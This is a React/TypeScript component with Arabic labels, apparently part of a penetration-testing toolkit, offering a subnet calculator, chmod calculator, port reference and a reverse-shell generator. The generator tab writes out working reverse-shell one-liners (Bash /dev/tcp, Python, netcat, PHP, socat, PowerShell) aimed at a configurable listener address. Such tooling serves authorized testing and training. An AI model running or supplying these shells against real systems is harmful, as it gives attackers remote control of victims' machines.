import { useMemo, useState } from 'react';
import { Search } from 'lucide-react';
import { COMMON_PORTS } from '../data/portsData';
import { VaultItem } from '../types';
import { calculateSubnet } from '../utils/network';
import { CodeBlock } from './CodeBlock';

interface NetworkAndUtilsLabProps {
  onSaveItem: (item: Omit<VaultItem, 'id' | 'createdAt'>) => void;
  savedContents: Set<string>;
}

type NetTab = 'subnet' | 'revshell' | 'chmod' | 'ports';

export function NetworkAndUtilsLab({ onSaveItem, savedContents }: NetworkAndUtilsLabProps) {
  const [tab, setTab] = useState<NetTab>('subnet');

  // Subnet state
  const [ipInput, setIpInput] = useState('192.168.10.45');
  const [cidr, setCidr] = useState(24);
  const subnet = useMemo(() => calculateSubnet(ipInput, cidr), [ipInput, cidr]);

  // Reverse shell state
  const [lhost, setLhost] = useState('10.10.14.5');
  const [lport, setLport] = useState('4444');
  const [shellPath, setShellPath] = useState('/bin/bash');

  // Chmod state
  const [ownerPerms, setOwnerPerms] = useState({ r: true, w: true, x: true });
  const [groupPerms, setGroupPerms] = useState({ r: true, w: false, x: true });
  const [otherPerms, setOtherPerms] = useState({ r: true, w: false, x: true });
  const [specialBits, setSpecialBits] = useState({ suid: false, sgid: false, sticky: false });
  const [chmodPath, setChmodPath] = useState('script.sh');

  // Ports search
  const [portQuery, setPortQuery] = useState('');

  const reverseShells = useMemo(() => {
    const ip = lhost.trim() || '10.10.14.5';
    const port = lport.trim() || '4444';
    const sh = shellPath;
    return [
      {
        name: 'Netcat Listener (على جهاز الفحص)',
        code: `rlwrap nc -lvnp ${port}`,
      },
      {
        name: 'Bash TCP',
        code: `${sh} -i >& /dev/tcp/${ip}/${port} 0>&1`,
      },
      {
        name: 'Python 3',
        code: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("${sh}")'`,
      },
      {
        name: 'Netcat (mkfifo - يعمل على أغلب الأنظمة)',
        code: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${sh} -i 2>&1|nc ${ip} ${port} >/tmp/f`,
      },
      {
        name: 'Netcat (-e)',
        code: `nc -e ${sh} ${ip} ${port}`,
      },
      {
        name: 'PHP',
        code: `php -r '$sock=fsockopen("${ip}",${port});exec("${sh} <&3 >&3 2>&3");'`,
      },
      {
        name: 'Socat (جلسة تفاعلية كاملة)',
        code: `socat TCP:${ip}:${port} EXEC:${sh},pty,stderr,setsid,sigint,sane`,
      },
      {
        name: 'Windows PowerShell TCP',
        code: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
      },
    ];
  }, [lhost, lport, shellPath]);

  const chmodComputed = useMemo(() => {
    const calcDigit = (p: { r: boolean; w: boolean; x: boolean }) =>
      (p.r ? 4 : 0) + (p.w ? 2 : 0) + (p.x ? 1 : 0);
    const special =
      (specialBits.suid ? 4 : 0) + (specialBits.sgid ? 2 : 0) + (specialBits.sticky ? 1 : 0);

    const octalCore = `${calcDigit(ownerPerms)}${calcDigit(groupPerms)}${calcDigit(otherPerms)}`;
    const fullOctal = special > 0 ? `${special}${octalCore}` : octalCore;

    const toSym = (p: { r: boolean; w: boolean; x: boolean }, sChar?: string, sActive?: boolean) => {
      const r = p.r ? 'r' : '-';
      const w = p.w ? 'w' : '-';
      let x = p.x ? 'x' : '-';
      if (sActive && sChar) {
        x = p.x ? sChar.toLowerCase() : sChar.toUpperCase();
      }
      return `${r}${w}${x}`;
    };

    const symbolic =
      toSym(ownerPerms, 's', specialBits.suid) +
      toSym(groupPerms, 's', specialBits.sgid) +
      toSym(otherPerms, 't', specialBits.sticky);

    return {
      octal: fullOctal,
      symbolic,
      command: `chmod ${fullOctal} ${chmodPath.trim() || 'file'}`,
    };
  }, [ownerPerms, groupPerms, otherPerms, specialBits, chmodPath]);

  const filteredPorts = useMemo(() => {
    const q = portQuery.trim().toLowerCase();
    if (!q) return COMMON_PORTS;
    return COMMON_PORTS.filter(
      (p) =>
        String(p.port).includes(q) ||
        p.service.toLowerCase().includes(q) ||
        p.description.toLowerCase().includes(q) ||
        p.securityNote.toLowerCase().includes(q)
    );
  }, [portQuery]);

  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-xl font-bold text-slate-900 dark:text-slate-100">
          أدوات الشبكات، الصلاحيات، والمنافذ
        </h2>
        <p className="text-sm text-slate-600 dark:text-slate-400 mt-1">
          حاسبة CIDR، منشئ أوامر الـ Shells والمستمعات، حاسبة صلاحيات <code className="font-mono text-emerald-500">chmod</code>، ومرجع المنافذ.
        </p>
      </div>

      {/* Sub-tabs */}
      <div className="inline-flex flex-wrap items-center gap-1.5 p-1 rounded-lg bg-slate-100 dark:bg-slate-900 border border-slate-200 dark:border-slate-800">
        {[
          { id: 'subnet', label: 'حاسبة الشبكات (CIDR)' },
          { id: 'revshell', label: 'منشئ Reverse Shells' },
          { id: 'chmod', label: 'حاسبة صلاحيات chmod' },
          { id: 'ports', label: 'مرجع المنافذ القياسية' },
        ].map((item) => (
          <button
            key={item.id}
            type="button"
            onClick={() => setTab(item.id as NetTab)}
            className={`px-3.5 py-1.5 text-xs font-semibold rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer ${
              tab === item.id
                ? 'bg-emerald-600 text-white'
                : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-100'
            }`}
          >
            {item.label}
          </button>
        ))}
      </div>

      {/* Subnet Calculator */}
      {tab === 'subnet' && (
        <div className="p-6 rounded-lg border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900/50 space-y-6">
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <div className="sm:col-span-2">
              <label className="block text-xs font-semibold text-slate-600 dark:text-slate-400 mb-1.5">
                عنوان IPv4
              </label>
              <input
                type="text"
                dir="ltr"
                value={ipInput}
                onChange={(e) => setIpInput(e.target.value)}
                placeholder="192.168.10.45"
                className="w-full px-3.5 py-2.5 text-sm font-mono rounded-lg border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-slate-950 text-slate-900 dark:text-slate-100 focus:outline-none focus:border-emerald-500"
              />
            </div>
            <div>
              <label className="block text-xs font-semibold text-slate-600 dark:text-slate-400 mb-1.5">
                قناع CIDR (/{cidr})
              </label>
              <select
                dir="ltr"
                value={cidr}
                onChange={(e) => setCidr(Number(e.target.value))}
                className="w-full px-3.5 py-2.5 text-sm font-mono rounded-lg border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-slate-950 text-slate-900 dark:text-slate-100 focus:outline-none focus:border-emerald-500"
              >
                {Array.from({ length: 33 }, (_, i) => (
                  <option key={i} value={i}>
                    /{i}
                  </option>
                ))}
              </select>
            </div>
          </div>

          {!subnet ? (
            <div className="p-4 rounded-lg border border-rose-500/40 bg-rose-500/10 text-xs text-rose-400">
              يرجى إدخال عنوان IPv4 صحيح مثل 192.168.1.10
            </div>
          ) : (
            <div className="space-y-5">
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
                {[
                  { label: 'عنوان الشبكة (Network)', val: `${subnet.networkAddress}/${subnet.cidr}` },
                  { label: 'عنوان البث (Broadcast)', val: subnet.broadcastAddress },
                  { label: 'قناع الشبكة (Subnet Mask)', val: subnet.subnetMask },
                  { label: 'قناع البدل (Wildcard)', val: subnet.wildcardMask },
                  { label: 'أول جهاز متاح (First Host)', val: subnet.firstHost },
                  { label: 'آخر جهاز متاح (Last Host)', val: subnet.lastHost },
                  { label: 'الأجهزة القابلة للاستخدام', val: subnet.usableHosts.toLocaleString('en-US') },
                  { label: 'الفئة والنطاق', val: `Class ${subnet.ipClass} · ${subnet.scope}` },
                ].map((cell) => (
                  <div
                    key={cell.label}
                    className="p-3.5 rounded-lg border border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-950"
                  >
                    <div className="text-xs text-slate-500 dark:text-slate-400">{cell.label}</div>
                    <div dir="ltr" className="text-sm font-mono font-bold text-slate-900 dark:text-emerald-400 mt-1 text-right tabular-nums">
                      {cell.val}
                    </div>
                  </div>
                ))}
              </div>

              <div className="p-4 rounded-lg border border-slate-800 bg-slate-950 space-y-2 text-xs font-mono" dir="ltr">
                <div className="flex flex-wrap justify-between gap-2 text-slate-400">
                  <span>IP Binary:</span>
                  <span className="text-slate-200">{subnet.ipBinary}</span>
                </div>
                <div className="flex flex-wrap justify-between gap-2 text-slate-400">
                  <span>Mask Binary:</span>
                  <span className="text-emerald-400">{subnet.maskBinary}</span>
                </div>
              </div>

              <CodeBlock
                code={`nmap -sn ${subnet.networkAddress}/${subnet.cidr}`}
                label="اكتشاف أجهزة هذه الشبكة عبر Nmap"
                compact
                onSave={() =>
                  onSaveItem({
                    title: `Ping Sweep ${subnet.networkAddress}/${subnet.cidr}`,
                    category: 'nmap',
                    content: `nmap -sn ${subnet.networkAddress}/${subnet.cidr}`,
                  })
                }
                isSaved={savedContents.has(`nmap -sn ${subnet.networkAddress}/${subnet.cidr}`)}
              />
            </div>
          )}
        </div>
      )}

      {/* Reverse Shell Generator */}
      {tab === 'revshell' && (
        <div className="p-6 rounded-lg border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900/50 space-y-5">
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <div>
              <label className="block text-xs font-semibold text-slate-600 dark:text-slate-400 mb-1.5">
                عنوان المستمع (LHOST)
              </label>
              <input
                type="text"
                dir="ltr"
                value={lhost}
                onChange={(e) => setLhost(e.target.value)}
                className="w-full px-3 py-2 text-sm font-mono rounded-lg border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-slate-950 text-slate-900 dark:text-slate-100 focus:outline-none focus:border-emerald-500"
              />
            </div>
            <div>
              <label className="block text-xs font-semibold text-slate-600 dark:text-slate-400 mb-1.5">
                المنفذ (LPORT)
              </label>
              <input
                type="text"
                dir="ltr"
                value={lport}
                onChange={(e) => setLport(e.target.value)}
                className="w-full px-3 py-2 text-sm font-mono rounded-lg border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-slate-950 text-slate-900 dark:text-slate-100 focus:outline-none focus:border-emerald-500"
              />
            </div>
            <div>
              <label className="block text-xs font-semibold text-slate-600 dark:text-slate-400 mb-1.5">
                نوع الطرفية (Shell)
              </label>
              <select
                dir="ltr"
                value={shellPath}
                onChange={(e) => setShellPath(e.target.value)}
                className="w-full px-3 py-2 text-sm font-mono rounded-lg border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-slate-950 text-slate-900 dark:text-slate-100 focus:outline-none focus:border-emerald-500"
              >
                <option value="/bin/bash">/bin/bash</option>
                <option value="/bin/sh">/bin/sh</option>
                <option value="/bin/zsh">/bin/zsh</option>
              </select>
            </div>
          </div>

          <div className="space-y-4 pt-2">
            {reverseShells.map((item) => (
              <div key={item.name} className="space-y-1.5">
                <div className="text-xs font-semibold text-slate-700 dark:text-slate-300">
                  {item.name}
                </div>
                <CodeBlock
                  code={item.code}
                  label={item.name}
                  compact
                  onSave={() =>
                    onSaveItem({
                      title: item.name,
                      category: 'shell',
                      content: item.code,
                    })
                  }
                  isSaved={savedContents.has(item.code)}
                />
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Chmod Calculator */}
      {tab === 'chmod' && (
        <div className="p-6 rounded-lg border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900/50 space-y-6">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {[
              { title: 'المالك (Owner)', state: ownerPerms, setter: setOwnerPerms },
              { title: 'المجموعة (Group)', state: groupPerms, setter: setGroupPerms },
              { title: 'الآخرون (Others)', state: otherPerms, setter: setOtherPerms },
            ].map((group) => (
              <div
                key={group.title}
                className="p-4 rounded-lg border border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-950 space-y-3"
              >
                <div className="text-sm font-bold text-slate-900 dark:text-slate-100">
                  {group.title}
                </div>
                <div className="space-y-2">
                  {[
                    { key: 'r' as const, label: 'قراءة (Read · 4)' },
                    { key: 'w' as const, label: 'كتابة (Write · 2)' },
                    { key: 'x' as const, label: 'تنفيذ (Execute · 1)' },
                  ].map((perm) => (
                    <label
                      key={perm.key}
                      className="flex items-center justify-between text-xs text-slate-700 dark:text-slate-300 cursor-pointer"
                    >
                      <span>{perm.label}</span>
                      <input
                        type="checkbox"
                        checked={group.state[perm.key]}
                        onChange={() =>
                          group.setter((prev) => ({ ...prev, [perm.key]: !prev[perm.key] }))
                        }
                        className="w-4 h-4 accent-emerald-600 rounded"
                      />
                    </label>
                  ))}
                </div>
              </div>
            ))}
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 items-end">
            <div className="flex flex-wrap gap-4">
              {[
                { key: 'suid' as const, label: 'SUID (4)' },
                { key: 'sgid' as const, label: 'SGID (2)' },
                { key: 'sticky' as const, label: 'Sticky Bit (1)' },
              ].map((sp) => (
                <label key={sp.key} className="inline-flex items-center gap-2 text-xs text-slate-700 dark:text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={specialBits[sp.key]}
                    onChange={() =>
                      setSpecialBits((prev) => ({ ...prev, [sp.key]: !prev[sp.key] }))
                    }
                    className="w-4 h-4 accent-emerald-600 rounded"
                  />
                  <span>{sp.label}</span>
                </label>
              ))}
            </div>

            <div>
              <label className="block text-xs font-semibold text-slate-600 dark:text-slate-400 mb-1">
                اسم الملف أو المجلد
              </label>
              <input
                type="text"
                dir="ltr"
                value={chmodPath}
                onChange={(e) => setChmodPath(e.target.value)}
                className="w-full px-3 py-2 text-xs font-mono rounded-lg border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-slate-950 text-slate-900 dark:text-slate-100"
              />
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div className="p-4 rounded-lg border border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-950">
              <div className="text-xs text-slate-500 dark:text-slate-400">الترميز الرقمي (Octal)</div>
              <div dir="ltr" className="text-2xl font-mono font-bold text-emerald-500 mt-1 text-right">
                {chmodComputed.octal}
              </div>
            </div>
            <div className="p-4 rounded-lg border border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-950">
              <div className="text-xs text-slate-500 dark:text-slate-400">التمثيل الرمزي (Symbolic)</div>
              <div dir="ltr" className="text-2xl font-mono font-bold text-slate-900 dark:text-slate-100 mt-1 text-right">
                {chmodComputed.symbolic}
              </div>
            </div>
          </div>

          <CodeBlock
            code={chmodComputed.command}
            label="chmod"
            compact
            onSave={() =>
              onSaveItem({
                title: `صلاحيات ${chmodPath} (${chmodComputed.octal})`,
                category: 'linux',
                content: chmodComputed.command,
              })
            }
            isSaved={savedContents.has(chmodComputed.command)}
          />
        </div>
      )}

      {/* Ports Reference Table */}
      {tab === 'ports' && (
        <div className="space-y-4">
          <div className="relative max-w-md">
            <Search className="w-4 h-4 text-slate-400 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />
            <input
              type="text"
              value={portQuery}
              onChange={(e) => setPortQuery(e.target.value)}
              placeholder="ابحث برقم المنفذ أو الخدمة (مثل 445 أو SMB أو SSH)..."
              className="w-full pr-9 pl-3 py-2 text-sm rounded-lg border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 text-slate-900 dark:text-slate-100 focus:outline-none focus:border-emerald-500"
            />
          </div>

          <div className="rounded-lg border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900/50 overflow-x-auto">
            <table className="w-full text-right border-collapse">
              <thead>
                <tr className="border-b border-slate-200 dark:border-slate-800 text-xs font-semibold text-slate-500 dark:text-slate-400 bg-slate-50 dark:bg-slate-900">
                  <th className="py-3 px-4">المنفذ</th>
                  <th className="py-3 px-4">البروتوكول</th>
                  <th className="py-3 px-4">الخدمة</th>
                  <th className="py-3 px-4">الوصف وملاحظات الفحص</th>
                  <th className="py-3 px-4">سكربت Nmap مقترح</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-200 dark:divide-slate-800 text-sm">
                {filteredPorts.map((p) => (
                  <tr
                    key={`${p.port}-${p.service}`}
                    className="hover:bg-slate-50 dark:hover:bg-slate-800/40 transition-colors"
                  >
                    <td className="py-3 px-4 font-mono font-bold text-emerald-500 tabular-nums" dir="ltr">
                      {p.port}
                    </td>
                    <td className="py-3 px-4 font-mono text-xs text-slate-600 dark:text-slate-400" dir="ltr">
                      {p.protocol}
                    </td>
                    <td className="py-3 px-4 font-mono font-semibold text-slate-900 dark:text-slate-100" dir="ltr">
                      {p.service}
                    </td>
                    <td className="py-3 px-4">
                      <div className="font-medium text-slate-800 dark:text-slate-200 text-xs">
                        {p.description}
                      </div>
                      <div className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                        {p.securityNote}
                      </div>
                    </td>
                    <td className="py-3 px-4 font-mono text-xs text-slate-600 dark:text-emerald-400" dir="ltr">
                      {p.nmapScript || '—'}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  );
}
